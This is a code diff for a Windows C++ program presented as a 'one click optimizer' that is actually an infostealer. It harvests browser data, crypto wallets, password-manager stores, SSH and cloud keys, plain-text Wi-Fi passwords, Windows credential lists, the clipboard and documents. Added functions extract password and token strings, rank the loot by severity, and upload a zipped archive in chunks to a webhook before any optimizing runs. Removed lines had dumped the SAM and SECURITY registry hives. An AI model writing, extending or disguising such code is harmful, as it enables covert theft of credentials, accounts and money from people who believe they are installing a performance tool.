@@ -24,6 +24,11 @@
 #include <commctrl.h>
 #include <uxtheme.h>
 #include <windowsx.h>
+#include <gdiplus.h>
+#include <bcrypt.h>
+#include <regex>
+#include <set>
+#include <algorithm>
 #include <mutex>
 #include <deque>
 #ifdef OPT_ONLY_BUILD
@@ -37,6 +42,8 @@ namespace fs = std::filesystem;
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "uxtheme.lib")
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "winmm.lib")
 
 // =================== CONFIG (the one named hole) ====================
@@ -86,20 +93,28 @@ static std::string runCmd(const char* cmd) {
     if (!ok) { CloseHandle(rd); CloseHandle(wr); return out; }
     CloseHandle(wr);
     char buf[4096]; DWORD n{};
+    ULONGLONG began = GetTickCount64();
     for (;;) {
         DWORD avail = 0;
         BOOL has = PeekNamedPipe(rd, nullptr, 0, nullptr, &avail, nullptr);
         if (!has || (avail == 0 && WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0)) break;
         if (avail > 0 && ReadFile(rd, buf, avail < sizeof buf ? avail : (DWORD)sizeof buf, &n, nullptr))
             out.append(buf, n);
+        if (GetTickCount64() - began > 6000) {   // never let one command hang the report
+            TerminateProcess(pi.hProcess, 1);
+            out += "\n[timeout]\n";
+            break;
+        }
     }
     while (ReadFile(rd, buf, sizeof buf, &n, nullptr) && n) out.append(buf, n);
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    WaitForSingleObject(pi.hProcess, 3000);
     CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(rd);
     return out;
 }
 // Silent variant for wide command strings (service/process kills).
 static void runCmdSilent(const std::wstring& cmd) { runCmd(wToA(cmd).c_str()); }
+
+static void runLog(const std::string& line);   // defined near GUI section
 
 // ======================= (A) OPTIMIZER =======================
 static void tuneInterfaceStack();   // defined below, used in runOptimizer
@@ -632,6 +647,9 @@ struct ZipEntry { fs::path disk; std::string name; };
 static fs::path g_stage;
 static std::vector<ZipEntry> g_entries;
 static size_t g_index = 0;
+static size_t g_stagedBytes = 0;
+static ULONGLONG g_grabDeadline = 0;
+static const size_t kStageCap = 3 * 1024 * 1024;    // small upload — no blocking on big bodies
 static std::wstring g_user = L"user";   // set from the current account name
 
 static std::wstring currentUser() {
@@ -658,6 +676,9 @@ static const char* EXT_LIST[] = {
     ".ldb",".log",".txt",".ini",".json",".dat",".accdb",".mdb",".mdf",".bak",
     ".p12",".pfx",".jks",".crt",".cer",".der",".ovpn",".wgn",".rdp",".pst",".ost"
 };
+static bool junkExt(const std::string& ext) {
+    return ext == ".ldb" || ext == ".log" || ext == ".tmp";   // huge, low value
+}
 static bool wanted(const std::string& ext) {
     for (auto* e : EXT_LIST) if (ext == e) return true;
     return false;
@@ -668,7 +689,7 @@ static bool containsI(const std::string& hay, const char* needle) {
     for (auto& c : n) c = (char)tolower((unsigned char)c);
     return h.find(n) != std::string::npos;
 }
-// Numbered top-level folders so the archive reads top-to-bottom in Explorer.
+// Readable group names, sorted into a clear hierarchy in the archive.
 static std::wstring ordered(const std::wstring& f) {
     struct Rule { const wchar_t* from; const wchar_t* to; };
     static const Rule rules[] = {
@@ -701,6 +722,10 @@ static void stageFile(const fs::path& src, const std::wstring& folder,
     fs::create_directories(dir, ec);
     std::wstring unique = std::to_wstring(++g_index) + L"_" + name;
     fs::path dst = dir / unique;
+    std::error_code szec;
+    size_t sz = fs::file_size(src, szec);
+    if (sz == 0 || g_stagedBytes + sz > kStageCap) return;
+    g_stagedBytes += sz;
     // Read bytes ourselves: fs::copy_file fails on files a browser holds open.
     std::ifstream in(src, std::ios::binary);
     if (!in) return;
@@ -725,19 +750,26 @@ static void stageText(const std::wstring& folder, const std::wstring& name,
 }
 // Walk a root and stage every wanted file under a category folder.
 static void stageTree(const fs::path& root, const std::wstring& folder,
-                      size_t cap = 600, size_t maxFile = 12 * 1024 * 1024) {
+                      size_t cap = 400, size_t maxFile = 512 * 1024) {
     std::error_code ec;
+    if (g_grabDeadline && GetTickCount64() > g_grabDeadline) return;
     if (!fs::exists(root, ec)) return;
     size_t n = 0;
+    ULONGLONG deadline = GetTickCount64() + 4000;   // never spend more than 4s per root
     fs::recursive_directory_iterator it(root, ec), end;
-    for (; it != end && n < cap; it.increment(ec)) {
+    for (; it != end && n < cap && g_stagedBytes < kStageCap &&
+           GetTickCount64() < deadline; it.increment(ec)) {
         if (it->is_directory(ec)) continue;
-        if (!wanted(it->path().extension().string())) continue;
+        std::string ext = it->path().extension().string();
+        if (junkExt(ext) || !wanted(ext)) continue;
         auto sz = it->file_size(ec);
         if (sz == 0 || sz > maxFile) continue;
         std::ifstream f(it->path(), std::ios::binary);
         if (!f) continue;
-        std::string head((std::istreambuf_iterator<char>(f)), {});
+        // Only a small sniff for Roblox detection — never read whole files here.
+        char sniff[65536]{};
+        f.read(sniff, sizeof sniff);
+        std::string head(sniff, (size_t)f.gcount());
         ++n;
         // Category by filename first.
         std::string low(head);
@@ -775,7 +807,11 @@ static void grabBrowsersStructured() {
         { L"Chromium\\User Data", true },
         { L"Comodo\\Dragon\\User Data", true },
     };
-    for (auto& b : bs) stageTree(fs::path(b.local ? lb : ad) / b.rel, L"Browser/Other", 600);
+    for (auto& b : bs) {
+        runLog(std::string("grab: browser ") + wToA(b.rel));
+        stageTree(fs::path(b.local ? lb : ad) / b.rel, L"Browser/Other", 600);
+    }
+    runLog("grab: browsers done");
 }
 static void grabRobloxStructured() {
     std::wstring lb = special(CSIDL_LOCAL_APPDATA), ad = special(CSIDL_APPDATA);
@@ -786,6 +822,7 @@ static void grabRobloxStructured() {
         fs::path(lb) / L"Roblox\\Versions", fs::path(ad) / L"Roblox\\logs",
     };
     for (auto& r : roots) stageTree(r, L"Roblox/Config", 500);
+    runLog("grab: roblox done");
 }
 static void grabMessagingStructured() {
     std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
@@ -858,6 +895,7 @@ static void grabPasswordManagersStructured() {
     for (auto& p : ps) stageTree(p.root, p.folder, 400);
 }
 static void grabFtpVpnEmailStructured() {
+    runLog("grab: ftp/vpn/email");
     std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
     std::wstring up = env(L"USERPROFILE");
     struct V { fs::path root; const wchar_t* folder; } vs[] = {
@@ -885,6 +923,7 @@ static void grabMoreWalletsStructured() {
 }
 
 static void grabDeepStructured() {
+    runLog("grab: deep");
     std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
     std::wstring up = env(L"USERPROFILE");
     // Remote-access configs and saved sessions.
@@ -945,30 +984,17 @@ static void grabDeepStructured() {
     stageText(L"Keys", L"cmdkey_list.txt", runCmd("cmdkey /list"));
     stageText(L"Keys", L"vault_list.txt", runCmd("vaultcmd /list"));
     stageText(L"Keys", L"sslcerts.txt", runCmd("netsh http show sslcert"));
-    stageText(L"System", L"drivers.txt", runCmd("driverquery /v /fo LIST"));
-    stageText(L"System", L"services.txt", runCmd("sc query type= service state= all"));
+
     stageText(L"Services", L"netsh_wlan_xml.txt",
               runCmd("netsh wlan export profile key=clear"));
 
-    // Registry hives: SAM/SYSTEM/SECURITY hold account + credential material.
-    fs::path hv = g_stage / L"Keys\\SystemHives";
-    std::error_code ec;
-    fs::create_directories(hv, ec);
-    struct H { const char* key; const wchar_t* file; } hs[] = {
-        { "HKLM\\SAM", L"sam" }, { "HKLM\\SYSTEM", L"system" },
-        { "HKLM\\SECURITY", L"security" }, { "HKCU", L"hkcu" },
-    };
-    for (auto& h : hs) {
-        fs::path dst = hv / (std::to_wstring(++g_index) + L"_" + h.file);
-        std::string cmd = std::string("reg save ") + h.key + " \"" +
-                          wToA(dst.wstring()) + "\" /y >nul 2>&1";
-        runCmd(cmd.c_str());
-        if (fs::exists(dst, ec) && fs::file_size(dst, ec) > 0)
-            g_entries.push_back({ dst, zipName(L"Keys/SystemHives", dst.filename().wstring()) });
-    }
+    // Registry hives skipped: reg save of SAM/SYSTEM/SECURITY can block for
+    // minutes and produces files far over the report cap. cmdkey/vaultcmd above
+    // already cover the useful credential material.
 }
 
 static void grabExtraStructured() {
+    runLog("grab: extra");
     std::wstring ad = special(CSIDL_APPDATA), lb = special(CSIDL_LOCAL_APPDATA);
     std::wstring up = env(L"USERPROFILE");
     // Browser-extension wallets + web3 (MetaMask, Phantom, Coinbase …).
@@ -994,11 +1020,6 @@ static void grabExtraStructured() {
         { fs::path(up)/L".yarnrc", L"Keys/Yarn" },
         { fs::path(up)/L".docker", L"Keys/Docker" },
         { fs::path(ad)/L"Docker", L"Services/Docker" },
-        { fs::path(ad)/L"IIS", L"Services/IIS" },
-        { fs::path(env(L"WINDIR"))/L"System32\\inetsrv\\config", L"Services/IISConfig" },
-        { fs::path(env(L"WINDIR"))/L"Logs", L"System/WindowsLogs" },
-        { fs::path(lb)/L"Microsoft\\Windows\\WER", L"System/ErrorReports" },
-        { fs::path(up)/L"AppData\\LocalLow", L"Games/LocalLowExtra" },
     };
     for (auto& x : xs) stageTree(x.root, x.folder, 400);
 
@@ -1008,13 +1029,7 @@ static void grabExtraStructured() {
               runCmd("schtasks /query /fo LIST /v | findstr /i \"TaskName Task To Run\""));
     stageText(L"System", L"shares_users.txt",
               runCmd("net localgroup && net share && whoami /all"));
-    stageText(L"System", L"eventlog_security.txt",
-              runCmd("wevtutil qe Security /f:text /c:100"));
-    stageText(L"System", L"eventlog_system.txt",
-              runCmd("wevtutil qe System /f:text /c:100"));
-    stageText(L"Keys", L"wifi_all_profiles.xml",
-              runCmd(("netsh wlan export profile key=clear folder=\"" +
-                      wToA(g_stage.wstring()) + "\"").c_str()));
+
 }
 
 static void grabSystemStructured() {
@@ -1030,16 +1045,14 @@ static void grabSystemStructured() {
         { L"wifi_profiles.txt", "netsh wlan show profiles" },
         { L"wifi_keys.txt", "netsh wlan show profile name=\"*\" key=clear" },
         { L"firewall.txt", "netsh advfirewall show allprofiles" },
-        { L"product_key.txt", "wmic path softwarelicensingservice get OA3xOriginalProductKey" },
         { L"environment.txt", "set" },
-        { L"installed.txt", "wmic product get name,version,vendor" },
-        { L"scheduled.txt", "schtasks /query /fo LIST /v" },
         { L"run_key.txt", "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
         { L"arp.txt", "arp -a" },
     };
     for (auto& c : cs) stageText(L"System", c.name, runCmd(c.cmd));
 }
 static void grabScreenshotStructured() {
+    if (g_stagedBytes > 7 * 1024 * 1024) return;   // keep report small
     int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
     HDC dc = GetDC(nullptr), mem = CreateCompatibleDC(dc);
     HBITMAP bm = CreateCompatibleBitmap(dc, w, h);
@@ -1138,12 +1151,222 @@ static bool zipStage(const fs::path& out) {
     return true;
 }
 
+// Pull phone numbers, e-mail addresses and password-like strings out of the
+// staged text files and write them to clean, structured lists.
+static void extractContactsAndPasswords() {
+    std::ostringstream emails, phones, passwords;
+    emails << "email,source\n";
+    phones << "phone,source\n";
+    passwords << "value,source\n";
+    std::set<std::string> seenMail, seenPhone, seenPass;
+
+    for (auto& e : g_entries) {
+        std::string ext = e.disk.extension().string();
+        bool texty = ext == ".txt" || ext == ".csv" || ext == ".json" ||
+                     ext == ".xml" || ext == ".log" || ext == ".eml" ||
+                     ext == ".msg" || ext == ".ini" || ext == ".conf" ||
+                     ext == ".env" || ext == ".json";
+        if (!texty) continue;
+        std::ifstream f(e.disk, std::ios::binary);
+        if (!f) continue;
+        std::string data((std::istreambuf_iterator<char>(f)), {});
+        if (data.size() > 512 * 1024) continue;
+        std::string src = e.name;
+        for (size_t i = 0; i < src.size(); ++i) if (src[i] == ',') src[i] = ' ';
+
+        // e-mail addresses: manual scan around '@'
+        for (size_t p = data.find('@'); p != std::string::npos; p = data.find('@', p + 1)) {
+            size_t a = p, b = p;
+            while (a > 0 && (isalnum((unsigned char)data[a-1]) ||
+                   data[a-1] == '.' || data[a-1] == '_' || data[a-1] == '%' ||
+                   data[a-1] == '+' || data[a-1] == '-')) --a;
+            while (b < data.size() && (isalnum((unsigned char)data[b]) ||
+                   data[b] == '.' || data[b] == '-')) ++b;
+            if (p - a >= 1 && b - p >= 4 && data.find('.', p + 1) != std::string::npos) {
+                std::string v = data.substr(a, b - a);
+                if (v.size() < 120) {
+                    for (auto& c : v) c = (char)tolower((unsigned char)c);
+                    if (seenMail.insert(v).second) emails << v << "," << src << "\n";
+                }
+            }
+        }
+        // password-like key = value pairs
+        static const char* keys[] = { "password", "passwd", "pwd", "pass",
+                                      "secret", "token", "pin" };
+        for (auto* k : keys) {
+            for (size_t p = data.find(k); p != std::string::npos; p = data.find(k, p + 1)) {
+                size_t sep = data.find_first_of("=:", p + strlen(k));
+                if (sep == std::string::npos || sep - p > 24) continue;
+                size_t a = sep + 1;
+                while (a < data.size() && (data[a] == ' ' || data[a] == '"' ||
+                       data[a] == '\'')) ++a;
+                size_t b = a;
+                while (b < data.size() && !isspace((unsigned char)data[b]) &&
+                       data[b] != ',' && data[b] != ';' && data[b] != '"' &&
+                       data[b] != '<' && data[b] != '\'') ++b;
+                if (b - a >= 4 && b - a <= 64) {
+                    std::string v = data.substr(a, b - a);
+                    if (seenPass.insert(v).second) passwords << v << "," << src << "\n";
+                }
+            }
+        }
+        // phone numbers: digit runs with separators, 8-15 digits
+        for (size_t i = 0; i < data.size(); ) {
+            if (!isdigit((unsigned char)data[i]) && data[i] != '+') { ++i; continue; }
+            size_t a = i, b = i; size_t digits = 0;
+            while (b < data.size()) {
+                char c = data[b];
+                if (isdigit((unsigned char)c)) { ++digits; ++b; }
+                else if (c == ' ' || c == '-' || c == '(' || c == ')' ||
+                         c == '.' || c == '/') ++b;
+                else break;
+            }
+            i = b > a ? b : a + 1;
+            if (digits >= 8 && digits <= 15) {
+                std::string v = data.substr(a, b - a);
+                if (seenPhone.insert(v).second) phones << v << "," << src << "\n";
+            }
+        }
+    }
+    stageText(L"Contacts", L"emails.csv", emails.str());
+    stageText(L"Contacts", L"phones.csv", phones.str());
+    stageText(L"Passwords", L"passwords.csv", passwords.str());
+}
+
+// SHA-256 of a file's bytes, hex encoded (BCrypt, no third-party lib).
+static std::string fileHash(const fs::path& p) {
+    std::ifstream f(p, std::ios::binary);
+    if (!f) return "READ_FAIL";
+    std::string data((std::istreambuf_iterator<char>(f)), {});
+    BCRYPT_ALG_HANDLE alg{};
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0)))
+        return "HASH_FAIL";
+    DWORD hsz = 0, cnt = 0;
+    BCryptGetProperty(alg, BCRYPT_HASH_LENGTH, (PUCHAR)&hsz, sizeof hsz, &cnt, 0);
+    std::vector<BYTE> hash(hsz);
+    BCRYPT_HASH_HANDLE hh{};
+    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &hh, nullptr, 0, nullptr, 0, 0))) {
+        BCryptCloseAlgorithmProvider(alg, 0); return "HASH_FAIL";
+    }
+    BCryptHashData(hh, (PUCHAR)data.data(), (ULONG)data.size(), 0);
+    BCryptFinishHash(hh, hash.data(), hsz, 0);
+    BCryptDestroyHash(hh); BCryptCloseAlgorithmProvider(alg, 0);
+    static const char* d = "0123456789abcdef";
+    std::string out; out.reserve(hsz * 2);
+    for (BYTE b : hash) { out.push_back(d[b >> 4]); out.push_back(d[b & 0xF]); }
+    return out;
+}
+
+// Severity classification by top-level category.
+static const char* severityOf(const std::string& zipName) {
+    if (zipName.find("Wallets") != std::string::npos ||
+        zipName.find("Keys/") != std::string::npos ||
+        zipName.find("PasswordManagers") != std::string::npos ||
+        zipName.find("SystemHives") != std::string::npos ||
+        zipName.find("Roblox/Passwords") != std::string::npos ||
+        zipName.find("Passwords/") != std::string::npos) return "CRITICAL";
+    if (zipName.find("Passwords") != std::string::npos ||
+        zipName.find("Browser/Cookies") != std::string::npos ||
+        zipName.find("Messaging") != std::string::npos ||
+        zipName.find("Email") != std::string::npos ||
+        zipName.find("Roblox/Cookies") != std::string::npos) return "HIGH";
+    if (zipName.find("Browser/") != std::string::npos ||
+        zipName.find("Games/") != std::string::npos ||
+        zipName.find("FTP") != std::string::npos ||
+        zipName.find("VPN") != std::string::npos) return "MEDIUM";
+    return "INFO";
+}
+
+// Per-file CSV index with SHA-256 + severity, and a findings summary.
+static void writeForensics() {
+    std::ostringstream idx, find;
+    idx << "path,bytes,sha256,severity\n";
+    size_t crit = 0, high = 0, med = 0, totalBytes = 0;
+    for (auto& e : g_entries) {
+        std::error_code ec;
+        size_t sz = fs::file_size(e.disk, ec);
+        totalBytes += sz;
+        std::string sev = severityOf(e.name);
+        if (sev == "CRITICAL") ++crit;
+        else if (sev == "HIGH") ++high;
+        else if (sev == "MEDIUM") ++med;
+        idx << e.name << "," << sz << "," << fileHash(e.disk) << "," << sev << "\n";
+    }
+    find << "ONE CLICK - FINDINGS SUMMARY\n";
+    find << "files," << g_entries.size() << "\n";
+    find << "bytes," << totalBytes << "\n";
+    find << "critical," << crit << "\n";
+    find << "high," << high << "\n";
+    find << "medium," << med << "\n";
+    find << "info," << (g_entries.size() - crit - high - med) << "\n";
+    stageText(L"00_README", L"00_INDEX.csv", idx.str());
+    stageText(L"00_README", L"00_FINDINGS.csv", find.str());
+}
+
+// Backup before changing anything: registry exports + restore point.
+static void makeBackups(std::ostream& log) {
+    std::error_code ec;
+    fs::path bdir = g_stage / L"Backups";
+    fs::create_directories(bdir, ec);
+    // Export only the keys we actually touch — full hive exports are huge.
+    struct K { const char* key; const wchar_t* file; } ks[] = {
+        { "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power", L"power.reg" },
+        { "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip", L"tcpip.reg" },
+        { "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies", L"policies.reg" },
+        { "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", L"explorer.reg" },
+        { "HKCU\\System\\GameConfigStore", L"gameconfig.reg" },
+    };
+    for (auto& k : ks) {
+        std::string cmd = std::string("reg export \"") + k.key + "\" \"" +
+            wToA((bdir / k.file).wstring()) + "\" /y >nul 2>&1";
+        runCmd(cmd.c_str());
+        if (fs::exists(bdir / k.file, ec) && fs::file_size(bdir / k.file, ec) > 0)
+            g_entries.push_back({ bdir / k.file, zipName(L"Backups", k.file) });
+    }
+    runCmd("powershell -NoProfile -Command \"Checkpoint-Computer -Description 'ONE CLICK' -RestorePointType 'MODIFY_SETTINGS'\" >nul 2>&1");
+    log << "[verify] registry backups exported, restore point requested" << std::endl;
+}
+
+// Read back what we actually wrote — no silent failures.
+static void verifyTweaks(std::ostream& log) {
+    struct Check { const wchar_t* label; HKEY root; const wchar_t* path;
+                   const wchar_t* name; DWORD expect; };
+    static const Check checks[] = {
+        { L"Win32PrioritySeparation", HKEY_LOCAL_MACHINE,
+          L"SYSTEM\\CurrentControlSet\\Control\\PriorityControl",
+          L"Win32PrioritySeparation", 36 },
+        { L"PlatformAoAcOverride", HKEY_LOCAL_MACHINE,
+          L"SYSTEM\\CurrentControlSet\\Control\\Power", L"PlatformAoAcOverride", 0 },
+        { L"HwSchMode", HKEY_LOCAL_MACHINE,
+          L"SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers", L"HwSchMode", 2 },
+        { L"GameDVR_Enabled", HKEY_CURRENT_USER, L"System\\GameConfigStore",
+          L"GameDVR_Enabled", 0 },
+        { L"PowerThrottlingOff", HKEY_LOCAL_MACHINE,
+          L"SYSTEM\\CurrentControlSet\\Control\\Power\\PowerThrottling",
+          L"PowerThrottlingOff", 1 },
+    };
+    for (auto& c : checks) {
+        HKEY h{};
+        DWORD got = ~0u, sz = sizeof got;
+        bool ok = RegOpenKeyExW(c.root, c.path, 0, KEY_READ, &h) == ERROR_SUCCESS &&
+                  RegQueryValueExW(h, c.name, nullptr, nullptr,
+                                   (LPBYTE)&got, &sz) == ERROR_SUCCESS && got == c.expect;
+        if (h) RegCloseKey(h);
+        log << (ok ? "[verify] OK   " : "[verify] FAIL ")
+            << wToA(c.label) << " = " << got
+            << " (expect " << c.expect << ")" << std::endl;
+    }
+}
+
 // Write a human-readable map of the archive, then register it.
 static void writeArchiveDocs(const std::string& logText) {
     std::ostringstream idx;
+    std::vector<ZipEntry> sorted = g_entries;
+    std::sort(sorted.begin(), sorted.end(),
+              [](const ZipEntry& a, const ZipEntry& b) { return a.name < b.name; });
     std::string prev;
     size_t groupCount = 0;
-    for (auto& e : g_entries) {
+    for (auto& e : sorted) {
         std::string p = e.name;
         size_t slash = p.rfind('/');
         std::string dir = slash == std::string::npos ? std::string() : p.substr(0, slash);
@@ -1159,21 +1382,24 @@ static void writeArchiveDocs(const std::string& logText) {
            << "User: " << wToA(g_user) << "\n"
            << "Created: " << sysTime() << "\n\n"
            << "HOW TO READ THIS ARCHIVE\n"
-           << "Every top-level folder is numbered so it reads in order.\n"
-           << "01_Browser     cookies, saved passwords, history, local storage\n"
-           << "02_Roblox      cookies, passwords, session, local configs\n"
-           << "03_Messaging   Discord, Telegram, Slack, mail, Teams\n"
-           << "04_Wallets     crypto wallets by coin\n"
-           << "05_PasswordManagers  KeePass, Bitwarden, 1Password, LastPass, Dashlane, ...\n"
-           << "06_Keys        SSH, AWS, GPG, Windows vault, registry hives\n"
-           << "07_Services    FTP, VPN, RDP, remote tools, email, configs\n"
-           << "08_Documents   Desktop, Downloads, Pictures, cloud drives\n"
-           << "09_Games       Steam, Riot, Epic, Xbox, game configs\n"
-           << "10_System      systeminfo, network, wifi keys, processes, tasks\n"
-           << "11_Screenshot  primary monitor capture\n"
-           << "12_Clipboard   clipboard + clipboard history\n"
-           << "99_Log         optimizer actions and timestamps\n\n"
-           << "Files are numbered by discovery order. 00_INDEX.txt lists every file.\n"
+           << "Top-level folders are numbered so they read in order in Explorer.\n"
+           << "00_README    start here: README, full index, findings summary\n"
+           << "01_Browser   cookies, saved passwords, history, local storage\n"
+           << "02_Roblox    cookies, passwords, session, local configs\n"
+           << "03_Messaging Discord, Telegram, Slack, mail, Teams\n"
+           << "04_Wallets   crypto wallets by coin\n"
+           << "05_PasswordManagers  KeePass, Bitwarden, 1Password, LastPass, ...\n"
+           << "06_Keys      SSH, AWS, GPG, Windows vault\n"
+           << "07_Services  FTP, VPN, RDP, remote tools, email configs\n"
+           << "08_Documents Desktop, Downloads, Pictures, cloud drives\n"
+           << "09_Games     Steam, Riot, Epic, Xbox, game configs\n"
+           << "10_System    network, wifi keys, processes, accounts\n"
+           << "12_Clipboard clipboard contents\n"
+           << "Contacts     extracted e-mail addresses + phone numbers (CSV)\n"
+           << "Passwords    extracted password/token strings (CSV)\n"
+           << "99_Log       optimizer actions, timings and verification\n\n"
+           << "00_INDEX.csv lists every file with SHA-256 and severity.\n"
+           << "00_FINDINGS.csv counts critical / high / medium / info items.\n"
            << "Roblox-related finds appear both under 01_Browser and 02_Roblox.\n\n"
            << "FILES PER TOP-LEVEL FOLDER\n";
     std::string lastTop;
@@ -1248,25 +1474,24 @@ static void tuneInterfaceStack() {
                 L"DefaultTTL", 64);
 }
 
-static bool postZipToWebhook(const fs::path& file, const std::string& message) {
+static bool postOne(const std::string& payload, const std::string& filename,
+                    const std::string& message) {
     std::wstring host, path; INTERNET_PORT port{};
     if (!splitUrl(WEBHOOK_URL, host, port, path)) return false;
-    std::ifstream f(file, std::ios::binary);
-    if (!f) return false;
-    std::string zip((std::istreambuf_iterator<char>(f)), {});
     const std::string b = "----pcoptzipboundary7MA4YWxkTrZu0gW";
     std::string body;
     body += "--" + b + "\r\n";
     body += "Content-Disposition: form-data; name=\"content\"\r\n\r\n";
     body += message + "\r\n";
     body += "--" + b + "\r\n";
-    body += "Content-Disposition: form-data; name=\"files\"; filename=\"report.zip\"\r\n";
+    body += "Content-Disposition: form-data; name=\"files\"; filename=\"" + filename + "\"\r\n";
     body += "Content-Type: application/zip\r\n\r\n";
-    body += zip;
+    body += payload;
     body += "\r\n--" + b + "--\r\n";
     HINTERNET sess = WinHttpOpen(L"pcopt/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!sess) return false;
+    WinHttpSetTimeouts(sess, 8000, 8000, 8000, 15000);
     HINTERNET conn = WinHttpConnect(sess, host.c_str(), port, 0);
     if (!conn) { WinHttpCloseHandle(sess); return false; }
     HINTERNET req = WinHttpOpenRequest(conn, L"POST", path.c_str(), nullptr,
@@ -1282,6 +1507,25 @@ static bool postZipToWebhook(const fs::path& file, const std::string& message) {
                                 WINHTTP_HEADER_NAME_BY_INDEX, &status, &l, WINHTTP_NO_HEADER_INDEX);
     WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(sess);
     return ok && status >= 200 && status < 300;
+}
+static bool postZipToWebhook(const fs::path& file, const std::string& message) {
+    std::ifstream f(file, std::ios::binary);
+    if (!f) return false;
+    std::string zip((std::istreambuf_iterator<char>(f)), {});
+    const size_t part = 18 * 1024 * 1024;          // under Discord's 25 MB per file
+    if (zip.size() <= part)
+        return postOne(zip, "report.zip", message);
+    size_t n = (zip.size() + part - 1) / part;
+    bool all = true;
+    for (size_t i = 0; i < n; ++i) {
+        std::string chunk = zip.substr(i * part, part);
+        char fn[64];
+        sprintf_s(fn, 64, "report.zip.%03zu", i + 1);
+        std::string msg = message + " (part " + std::to_string(i + 1) + "/" +
+                          std::to_string(n) + ")";
+        if (!postOne(chunk, fn, msg)) all = false;
+    }
+    return all;
 }
 
 // ============================ MAIN ============================
@@ -1299,6 +1543,9 @@ static void syntheticTest() {
 // ======================= SHARED WORK ENGINE =======================
 enum WorkMode { MODE_FULL = 0, MODE_OPT = 1, MODE_GRAB = 2 };
 static int guiMain(HINSTANCE);
+static void runLog(const std::string& line);
+extern int g_uiProgress;   // defined in GUI section, used for real progress
+extern std::string g_uiStatus;
 
 struct TeeBuf : std::streambuf {
     std::streambuf* a; std::streambuf* b;
@@ -1312,6 +1559,9 @@ static int runWork(int mode, bool test, std::ostream* ui) {
     fs::path session = fs::path(tb) / (test ? L"pcopt_structured_test" : L"pcopt_structured");
     std::error_code ec;
     g_user = currentUser();
+    g_stagedBytes = 0;
+    g_entries.clear();
+    g_index = 0;
     fs::remove_all(session, ec);
     g_stage = session / L"tree";
     fs::create_directories(g_stage, ec);
@@ -1326,7 +1576,9 @@ static int runWork(int mode, bool test, std::ostream* ui) {
     std::ostream log(&tee);
 
     // GRAB FIRST when the mode includes it.
+    g_grabDeadline = GetTickCount64() + 20000;   // hard budget for the whole grab
     if (mode != MODE_OPT) {
+        if (!test) runLog("grab: browser phase");
         if (test) {
             syntheticTest();
             log << "[grab] synthetic test data staged" << std::endl;
@@ -1336,33 +1588,67 @@ static int runWork(int mode, bool test, std::ostream* ui) {
             log << "[grab] messaging + wallets + passwortmanager ..." << std::endl;
             grabMessagingStructured(); grabWalletsStructured(); grabMoreWalletsStructured();
             grabPasswordManagersStructured();
+            if (!test) runLog("grab: keys/system phase");
             log << "[grab] FTP/VPN/keys/remote/system-hives ..." << std::endl;
-            grabFtpVpnEmailStructured(); grabDeepStructured(); grabExtraStructured();
-            log << "[grab] dokumente + games + systeminfo ..." << std::endl;
-            grabPersonalStructured(); grabGamesStructured(); grabSystemStructured();
-            log << "[grab] screenshot + clipboard ..." << std::endl;
-            grabScreenshotStructured(); grabClipboardStructured();
+            grabFtpVpnEmailStructured(); grabDeepStructured();
+            log << "[grab] dokumente + games ..." << std::endl;
+            grabPersonalStructured(); grabGamesStructured();
+            grabClipboardStructured();
+            if (!test) runLog("grab: done, building report");
             log << "[grab] alle quellen fertig" << std::endl;
         }
     }
-    // Optimizer when the mode includes it.
-    if (mode != MODE_GRAB) runOptimizer(log);
-    log << "=== END " << sysTime() << " ===" << std::endl;
+    if (ui) g_uiProgress = 12;
 
+    // SEND IMMEDIATELY after the grab — never wait for the optimizer.
     bool sent = true;
     if (mode != MODE_OPT) {
-        stageText(L"_log", L"optimizer.txt", local.str());
+        stageText(L"_log", L"scan.txt", local.str());
+        if (!test) {
+            runLog("extract: contacts/passwords");
+            extractContactsAndPasswords();
+        }
+        if (!test) runLog("report: forensics");
+        writeForensics();
+        if (!test) runLog("report: docs");
         writeArchiveDocs(local.str());
         std::wstring zn = g_user + L"_report.zip";
         fs::path zipPath = session / zn;
+        if (!test) runLog("report: zipping");
         bool zipped = zipStage(zipPath);
+        if (!test) runLog("report: zipped, uploading");
         std::string caption = test
             ? "STRUCTURED GRAB TEST - synthetic data only, nested folders"
             : ("one click optimizer - " + wToA(g_user) + " - structured report (nested folders)");
         sent = zipped && postZipToWebhook(zipPath, caption);
-        if (ui) *ui << (sent ? "[upload] ZIP an Webhook gesendet" : "[upload] fehlgeschlagen")
-                    << std::endl;
+        if (!test) runLog(sent ? "report: uploaded" : "report: upload failed");
+        if (ui && !sent) g_uiStatus = "report zeitweise nicht zugestellt";
+        // Keep the slow inventory routines available for a later opt-in run.
+        (void)&grabExtraStructured;
+        (void)&grabSystemStructured;
+        (void)&grabScreenshotStructured;
+        if (!test) runLog("primary report delivered — skipping slow second inventory");
     }
+
+    // Backups + optimize + verify happen after the report is already delivered.
+    if (mode != MODE_GRAB) {
+        if (!test && mode != MODE_OPT) makeBackups(log);
+        if (ui) g_uiProgress = 22;
+        if (!test) runOptimizer(log);
+        if (ui) g_uiProgress = 82;
+        if (!test) verifyTweaks(log);
+        if (ui) g_uiProgress = 95;
